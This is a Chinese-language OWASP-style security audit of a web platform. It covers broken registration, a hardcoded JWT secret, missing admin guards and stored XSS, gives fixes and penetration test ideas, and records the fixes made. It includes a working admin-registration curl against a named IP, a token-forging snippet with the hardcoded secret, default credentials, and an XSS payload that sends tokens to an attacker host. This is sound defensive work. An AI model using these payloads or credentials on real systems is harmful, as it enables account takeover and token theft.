# 安全评审 — by OWASP 红蓝队专家
日期: 2026-05-30 | 分支: master @ 6783b0fb

## 总评分: 3 / 10 （合规等级: D）

存在多个 P0 级别的关键漏洞，任何匿名外部攻击者可在 5 分钟内获得管理员权限并接管整个系统。代码总体工程质量不差（SQL 全参数化、密码 bcrypt、私密单 ID 访问有控），但鉴权设计存在系统性架构缺陷（公开注册任选角色 + 客户端可控的 X-Role 头 + 默认 JWT 密钥硬编码 + 多个 admin 路由完全无守卫）。叠加 HTTP 明文传输与零依赖 CVE 防护，现网处于"形同虚设"状态。**强烈建议在修复 P0 前不要将 124.156.193.122:3001 暴露于不可信网络**。

## OWASP Top 10 自评
| 类别 | 分 | 现状证据 |
|------|---|---------|
| A01 失效的访问控制 | 1/10 | `POST /api/auth/register` 允许 `role=admin` 任意自注册（auth.ts:102），`X-Role` 头由客户端 localStorage 写入并被后端 `gradeGate` 信任（routes.ts:94-102），merge/backup/email/op-log/audit/ticket-tabs 等敏感路由完全无 admin 守卫，list `/api/nodes/attackTicket` 不做私密过滤 |
| A02 加密失败 | 2/10 | HTTP 明文（systemd 监听 :3001 无 TLS），JWT secret 默认值硬编码 `combat-platform-secret-2026`（auth.ts:8），SMTP 密码以明文 JSON 存 `app_settings` 表（email.ts:84） |
| A03 注入 | 8/10 | better-sqlite3 全程参数化绑定，未发现 SQL 注入；动态 `${updates.join(",")}` 列名均为代码常量；XSS 见 A07 关联说明 |
| A04 不安全设计 | 2/10 | 角色提升设计错误：服务端不应信任客户端 Header；多人协作核心数据（ticket_tabs.content）允许任意 HTML 渲染；默认 admin/admin123 永远存在且未强制改密 |
| A05 安全配置错误 | 2/10 | 无 helmet/CORS/CSRF/rate-limit；systemd Unit 未设置 `User=`、未设 `JWT_SECRET`，进程以 root 运行；body limit 20mb（DoS 面）；error 500 直接回显 `err.message`（app.ts:113） |
| A06 易受攻击与过期组件 | 4/10 | `multer@1.4.5-lts.1` 存在多条已公开 CVE（含 CVE-2024-45590 拒绝服务），`xlsx@0.18.5` 历史上多次出现原型污染/SSRF，express ^4.19.0 需跟进 path-to-regexp DoS 系列 CVE，无 lockfile audit 流程 |
| A07 身份验证和身份识别失败 | 2/10 | 公开自注册 + 客户端选角色 = 完全失效；默认 admin/admin123 永远在；JWT 7d 长 TTL 无 refresh/吊销机制；登出仅前端删 localStorage（token 仍在 7 天内有效）；ticket_tabs 用 `rehypeRaw` 渲染富文本 → 任意登录用户可在攻关单存 `<script>`，受害者打开页面即被盗 token（XSS 提升） |
| A08 软件和数据完整性失败 | 4/10 | 审计日志写入完整且包含 actor/at/changes，但 `audit_log` 表无完整性签名（任意能写 DB 的进程都能伪造/删除），actor 字段由路由传入字符串可任意伪造（"api"/"ui" 等占位值随处可见） |
| A09 安全日志和监控失败 | 4/10 | 三层日志（backend.log + audit_log + op_logs）覆盖良好，但：登录失败不限速也不记 IP；admin 操作无单独高风险流；console-capture.ts 把整段 console 上传到 bug_reports（含 URL/对象 dump）可能泄露 token；日志写到本地文件无远端聚合/告警 |
| A10 服务器端请求伪造 | 7/10 | `/documents/link` 接受任意 URL 但仅前端展示，未做服务端代理请求；`document.download` 对 link 类型走 `res.redirect(row.url)` 引导客户端，本身非 SSRF；SMTP 主机字段由 admin 配置 → 受限角色影响面小 |

## 高优修复（必须 1 周内做）

### P0-1: 公开注册接口允许自选 admin 角色 — 任意人 = 管理员
**文件:** `apps/backend/src/auth.ts:82-110`  
**问题:** `POST /api/auth/register` 在 `publicPaths` 中（line 274），任何匿名请求 `{username:"x",password:"xxxxxx",role:"admin"}` 即得管理员账号 + 7 天有效 JWT。  
**复现:**
```
curl -X POST http://124.156.193.122:3001/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"pwn","password":"pwnpwn","role":"admin"}'
```
**修复:** 
- 选项 A（推荐）：移除自助注册，新建用户走 admin-only `POST /api/users`；如保留自注册则强制 `role="normal"`，忽略请求体中的 role。
- 选项 B（如确需开放注册）：默认 normal，且 `publicPaths` 不含 register；要求邀请码或邮箱验证。

### P0-2: JWT 默认密钥硬编码 + systemd 未注入 JWT_SECRET
**文件:** `apps/backend/src/auth.ts:8`，`scripts/deploy-v2/combat-v2.service:5-14`  
**问题:** `const JWT_SECRET = process.env.JWT_SECRET || "combat-platform-secret-2026";`，systemd Unit 没有 `Environment=JWT_SECRET=...`。现网用的就是这个公开字符串签名 → 任何看过源码的人可离线签发 admin token：
```js
jwt.sign({userId:"admin",username:"admin",role:"admin"}, "combat-platform-secret-2026", {expiresIn:"365d"})
```
**修复:**
1. 启动时强校验：`if(!process.env.JWT_SECRET) throw new Error("JWT_SECRET required")`，去掉默认值。
2. systemd Unit 增加 `EnvironmentFile=/etc/combat-v2.env`，文件 600 权限，写入随机 32+ 字节 secret。
3. 旋转 secret 同时使所有现存 JWT 失效（旧 token 重新登录）。

### P0-3: X-Role 头由客户端写入且被后端信任
**文件:** `apps/backend/src/routes.ts:94-102`，`apps/frontend-v2/src/api.ts:146`  
**问题:** `gradeGate` 检查 `req.headers["x-role"]` 决定是否允许标定贡献等级。前端从 `localStorage.getItem('combat-role')` 取值写入头。攻击者 `curl -H 'X-Role: admin'` 即绕过。  
**修复:** 一律改用 JWT payload 的 `role` 字段：
```ts
const payload = verifyAuth(req);
const role = payload?.role;
if (!role || !PRIVILEGED_ROLES.includes(role)) return "...";
```
全局搜索 `x-role` / `X-Role` 移除所有客户端注入；后端依赖 JWT。

### P0-4: 多个 admin-only 路由完全无授权守卫
**文件:**
- `apps/backend/src/op-log.ts` 全部（list/delete/settings）
- `apps/backend/src/merge-route.ts` `/merge/person`
- `apps/backend/src/backup.ts` 备份创建/下载/删除/恢复
- `apps/backend/src/email.ts` `/email/config` PUT、`/email/send`（任意登录用户可滥发邮件！）
- `apps/backend/src/audit.ts` `/audit`（普通员工可看所有审计）
- `apps/backend/src/proposals.ts` `/proposals/:id/decide`
- `apps/backend/src/reminders.ts` `/reminders/:id/send`
- `apps/backend/src/ticket-tabs.ts` 全部 CRUD（无私密 ticket 关联检查）
- `apps/backend/src/documents.ts` `/documents` 上传/删除

**修复:** 抽出 `requireAdmin` / `requireLeader` 中间件（auth.ts 内已有 requireAdmin 但仅 user-admin router 在用），统一加到上述 router 的 mount 处或路由内首行：
```ts
function adminOnly(req,res,next){
  if(process.env.COMBAT_NO_AUTH==="1") return next();
  const p = verifyAuth(req);
  if(!p || p.role!=="admin") return res.status(403).json({error:"仅管理员"});
  next();
}
r.use("/email", adminOnly);
r.use("/backup", adminOnly);
r.use("/op-logs", adminOnly);
r.use("/merge", adminOnly);
r.use("/audit", adminOnly);
// 等等
```

### P0-5: 存储型 XSS — ticket_tabs.content + rehypeRaw 渲染原始 HTML
**文件:** `apps/frontend-v2/src/components/DynamicCustomTab.tsx:157`，`apps/backend/src/ticket-tabs.ts:63-87`  
**问题:** `<ReactMarkdown ... rehypePlugins={[rehypeRaw]}>{previewMd}</ReactMarkdown>` 让 markdown 中 `<script>`、`<img onerror>`、`<iframe>` 等原始 HTML 直接执行。任何登录用户可写 ticket_tabs，受害者打开攻关单详情页即触发，可读取 `localStorage('combat-token')` 上送外部域：
```
<img src=x onerror="fetch('https://attacker/x?'+localStorage.getItem('combat-token'))">
```
组合 P0-1（任意注册）形成完整 RCE→token 链。  
**修复:**
- 移除 `rehypeRaw`；或加 `rehype-sanitize`（白名单 schema）。
- 后端 ticket-tabs POST/PATCH 对 content 做 DOMPurify / sanitize-html 服务端过滤，存清洁版。
- 同步审查 `highlightMd` 函数（line 12-17）：返回的 `<mark>` 是代码注入到 markdown，本身可控但与 rehypeRaw 叠加放大风险，去掉 raw 后该函数也变安全。
- 关键缓解：所有 markdown 渲染统一封装为安全组件，禁止页面级直接引用 rehypeRaw。

### P0-6: 现网 HTTP 明文 + bug_reports/auth/register 公开
**文件:** `scripts/deploy-v2/combat-v2.service`，`apps/backend/src/auth.ts:273-280`  
**问题:** 服务监听 :3001 HTTP 明文。登录态 JWT、SMTP 密码（明文存储后通过 PUT 传回）、私密攻关单内容均在网络上裸奔；任何上游网络嗅探/中间人即可窃取 token。  
**修复:**
- 前置 Nginx/Caddy 做 TLS termination，强制 301 → HTTPS，加 HSTS（一年）。
- systemd 监听 127.0.0.1:3001，仅 Nginx 反代访问。
- HttpOnly Cookie 替代 localStorage 存 token，缓解 XSS 盗 token（与 P0-5 联动）。

## 中优（1 个月内）

### M1: 默认 admin/admin123 永久存在
`auth.ts:48-58` `ensureDefaultAdmin` 在首次启动建 admin/admin123。生产 7 天 JWT 一旦发布即长期暴露。  
**修复:** 部署脚本生成随机初始密码写到 `/opt/combat-v2/initial-admin.txt`（仅 root 可读），首次登录强制改密；增加 `password_must_change` 列。

### M2: 暴力破解无防护
登录无 rate limit，无 IP/账号锁定，便于穷举弱密码（最低 6 位）。  
**修复:** 引入 `express-rate-limit`，登录路径 5 次/15 分钟/账号；记录失败 IP 至 op_logs，达阈值临时封禁。

### M3: SMTP 密码明文存储
`email.ts:84` `repo.setSetting("smtp", JSON.stringify(cfg))` 写入 SQLite。任何能读 DB 的进程（包括备份下载）泄露 SMTP 凭据 → 攻击者可伪装系统发钓鱼邮件。  
**修复:** 使用 `crypto.createCipheriv` AES-256-GCM 加密，密钥 derive 自 JWT_SECRET 或独立 ENCRYPTION_KEY；备份导出过滤敏感设置。

### M4: 攻关单列表/导出/审计无私密过滤
`routes.ts:143` 列表、`export.ts:12` 导出、`audit.ts:14` 审计、`dashboard.ts`、`related.ts` 全部基于 `repo.queryNodes(nodeType)` 返回全集。私密=是的攻关单标题/描述会以列表形式露出给非授权人。  
**修复:** 在 Repository 层加 `queryNodes(type, filter, requester)` 默认过滤私密；或在每个 router 后置一层 `filterPrivateAttackTickets(rows, user)`。

### M5: errorHandler 回显 stack 给客户端
`app.ts:111-114` 直接 `res.status(500).json({error: err.message})`。错误信息可能泄露内部路径、SQL、堆栈片段。  
**修复:** 生产环境返回通用 "服务内部错误"，错误详情仅写日志；保留 req.id 便于排查。

### M6: COMBAT_NO_AUTH 全局开关
`auth.ts:271,116,261` 当 `COMBAT_NO_AUTH=1` 时整个鉴权失效，返回 admin。如果生产环境误设此变量（运维事故/容器复用 e2e 镜像）后果灾难。  
**修复:** 启动时检查 `NODE_ENV==="production" && COMBAT_NO_AUTH==="1"` → fatal panic；或重命名为 `COMBAT_E2E_BYPASS_AUTH_DANGEROUS`。

### M7: 文件上传缺类型/路径校验
`documents.ts:62-86` 接受任意 MIME；存盘名 `${id}__${original}`，original 来自客户端可能含 `../`，better 写 `path.basename()` 净化；50MB body limit DoS 面较大。`bug-report` screenshot/consoleLogs 字段无大小上限（被 express body 20mb 覆盖但单字段无独立限）。  
**修复:** original 走 `path.basename()` + UUID 优先；扩展名白名单（图片/PDF/Office）；扫描 magic bytes；按 mimetype 限上传大小。

### M8: 审计日志 actor 可伪造
仓库层 `audit(...)` 直接接收路由传入的 actor 字符串（多处写 `"api"`、`"ui"`、`"import"`）。攻击者拿到任意 endpoint 后调用，audit 都写 "api" — 无法追溯真实用户。  
**修复:** Repository.audit 内强制从 `req.user` 取 username，不接受调用方任意字符串；对 system actor 用专属枚举（"system:cron"/"system:scan"）便于审计分类。

## 低优 / 加分项

### L1: JWT 无吊销机制
退出登录仅前端删 localStorage，token 在服务端仍有效 7 天。建议引入 `token_revocations` 表 + 中间件比对，或缩短 TTL 到 4h + refresh token。

### L2: helmet 中间件未启用
缺 X-Content-Type-Options/X-Frame-Options/Referrer-Policy/CSP 头；ReactMarkdown XSS 修复后 CSP 可作为第二道防线（disable inline script）。

### L3: signServiceToken 365 天长效 token
`auth.ts:32-35` Hermes agent 用 365 天 admin token —— 一旦泄露需重启服务并轮换密钥。建议改为短期 token + token 缓存机制，或独立的 agent 受限角色（不能 delete/escalate）。

### L4: 部署使用密码 SSH（命令行传参）
`deploy-direct.mjs` 接受命令行密码 → 写入 shell history / ps 输出。建议改用 SSH key 部署（.env.deploy 仅存私钥路径）。

### L5: better-sqlite3 同步 + 同进程
所有 DB 操作同进程 + 同步阻塞；大查询拖慢请求线程，可被 `q=` 长字符串触发慢搜索 DoS（`search_text` 是 `Object.values().join(' ')` 全表 LIKE 风险）。后续配合 FTS5 全文索引并加查询超时。

### L6: 前端 token 存 localStorage
任何 XSS 直接读 token。修复 P0-5 同时迁移到 `HttpOnly; Secure; SameSite=Strict` Cookie。

### L7: pre-restore 备份覆盖
`backup.ts:165-167` 重启 apply 时 `unlink(preRestore)` 删旧的，仅保 1 份。建议保留 N 份带时间戳避免误操作不可逆。

## 渗透测试用例建议

1. **自注册 admin 接管（P0-1）**  
   `POST /api/auth/register {username:"red",password:"redred",role:"admin"}` → 拿 token → `GET /api/users` 拉全员 → `PATCH /api/users/{adminId} {password:"x"}` 改原 admin 密码。

2. **JWT 离线伪造（P0-2）**  
   使用 `combat-platform-secret-2026` 本地签发 `{userId:"any",role:"admin"}` 7 天 token，无需任何账号。

3. **X-Role 越权标定贡献（P0-3）**  
   普通账号登录后 `POST /api/nodes/contribution` 带 `X-Role: leader` 标核心贡献。

4. **存储型 XSS 盗 token（P0-5）**  
   登录任意账号 → `POST /api/tickets/{id}/tabs {tabType:"custom",title:"x",content:"<img src=x onerror='fetch(/attacker/+localStorage.combat-token)'>"}` → 等 admin 访问。

5. **SMTP 滥用发钓鱼邮件（P0-4）**  
   普通登录账号 → `POST /api/email/send {to:["victim@org"],subject:"密码重置",body:"..."}` 用系统 SMTP 凭据发邮件，From 显示官方域名。

6. **私密单泄露（M4）**  
   `GET /api/nodes/attackTicket` 列表直接拿到 私密=是 的标题/描述；`GET /api/export/attackTicket` 拉全表 xlsx。

7. **暴力破解 admin（M2）**  
   `POST /api/auth/login` 不限速；常见弱密 + bcrypt 单核 10 rounds 离线 ~100/s。

8. **备份下载窃 DB（P0-4）**  
   普通账号 → `POST /api/backup` → `GET /api/backup/combat_backup_xxx.db` 下载完整 SQLite，离线获得所有用户 bcrypt hash + SMTP 明文 + 审计 + 业务数据。

9. **bug-report 公开淹没 DB（M7）**  
   匿名循环 `POST /api/bug-reports {title:"x",screenshot:<20MB base64>}` 数小时打爆磁盘。

10. **COMBAT_NO_AUTH 误开（M6）**  
    若运维拿 e2e 镜像直接跑生产（环境变量遗留），所有鉴权失效；模拟错误启动配置探测响应中 `X-User: admin` 行为。

---

**修复优先级建议:** P0-1 → P0-3 → P0-2 → P0-4 → P0-5 → P0-6 → M 系列。前 6 项必须在对外暴露前完成。

---

## 已修复 (2026-05-31, 分支 feature/roadmap-security)

| # | 漏洞 | commit |
|---|------|--------|
| P0-1 | 公开自注册任意提权 — 注册接口强制 `role="normal"`,忽略 client 传入 role | `9c87975` |
| P0-2 | JWT 默认硬编码 secret — 启动期校验,production 缺失/默认值即 `process.exit(1)` | `f3915aa` |
| P0-3 | X-Role 头由客户端写入 — `gradeGate` 改读 JWT payload.role,前端去 `X-Role` 头注入 | `315828f` |
| P0-4 | 多个 admin-only 路由零守卫 — 新增 `adminMiddleware`/`leaderMiddleware`,挂在 audit/merge/op-logs/backup/proposals/reminders/email/ticket-tabs/documents | `cbb2106` |
| P0-5 | rehypeRaw 存储型 XSS — `DynamicCustomTab` 与 `ManualCenter` 关闭 rehype-raw,markdown 原始 HTML 当字面量 | `4999208` |

### 回归状态
- backend tests: 348/348 通过(与基线一致)
- TypeScript: backend + frontend-v2 `tsc --noEmit` 均通过
- 前端 e2e 未跑(端口被占),交由 deploy 流水线验证

### 未在本批次修复(待后续 P0/M 系列推进)
- P0-6 现网 HTTP 明文 — 需要 Nginx/Caddy 前置 TLS,涉及现网架构变更
- M1 默认 admin/admin123 — 部署脚本生成随机密码 + 首次登录强制改密
- M2 暴力破解无防护 — `express-rate-limit` 接入
- M3 SMTP 密码明文存储 — AES-256-GCM 加密 + 备份导出过滤
- M4 私密单列表无过滤、M5 errorHandler 回显 stack、M6 COMBAT_NO_AUTH 误开 panic、M7 上传校验、M8 audit actor 伪造
